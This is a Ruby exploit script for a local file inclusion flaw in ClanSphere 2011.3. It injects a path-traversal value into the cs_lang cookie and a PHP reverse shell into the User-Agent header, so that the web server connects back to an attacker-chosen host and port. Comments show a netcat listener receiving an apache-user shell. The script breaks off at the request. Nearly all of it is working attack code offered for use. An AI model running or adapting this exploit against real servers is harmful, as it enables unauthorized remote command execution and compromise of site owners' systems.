#!/usr/bin/ruby                                                                               
                                                                                              
# ClanSphere 2011.3 (cs_lang cookie parameter) LFI exploit by blkhtc0rp                                 
# Prior versions should also be affected.
#
# ./clanSphere-poc2.rb "http://www.example.com/" 127.0.0.1:8118 rhost.com.br 44444
# [x] ClanSphere 2011.3 (cs_lang) LFI exploit
# [x] Author: blkhtc0rp
# [x] Injecting malicious code into /proc/self/environ...
# [x] Launching reverse shell on rhost.com.br:44444...
#
# nc -vv -l 44444
# Connection from victim.com.br port 44444 [tcp/*] accepted
# id
# uid=48(apache) gid=48(apache) groups=48(apache)
#
require 'net/http'
require 'base64'

url = ARGV[0]
proxy = ARGV[1]
rhost = ARGV[2]
rport = ARGV[3]


uri = URI.parse(url)

px_addr, px_pt = proxy.split(/:/) if proxy

cookie = "blah=blah; cs_lang=../../../../../../../../../../../../../../../../proc/self/environ%00.png"


shell = "<?php \$ip = \'#{rhost}\';\$port = #{rport}; if (!(\$sock=fsockopen(\$ip,\$port))) die; while(!feof(\$sock)){ \$command = fgets(\$sock);\$pipe = popen(\$command,'r'); while (!feof(\$pipe)) fwrite (\$sock, fgets(\$pipe)); pclose(\$pipe);}fclose(\$sock);?>"


headers = { 'Cookie' => cookie,
            'User-Agent' => shell
          }

puts "[x] ClanSphere 2011.3 (cs_lang) LFI exploit"
puts "[x] Author: blkhtc0rp"
puts "[x] Injecting malicious code into /proc/self/environ..."
puts "[x] Launching reverse shell on #{rhost}:#{rport}..."

req = Net::HTTP::Post.new(uri.path, headers)

status = Net::HTTP.new(uri.host, uri.port, px_addr, px_pt).start do |http|
   http.request(req)
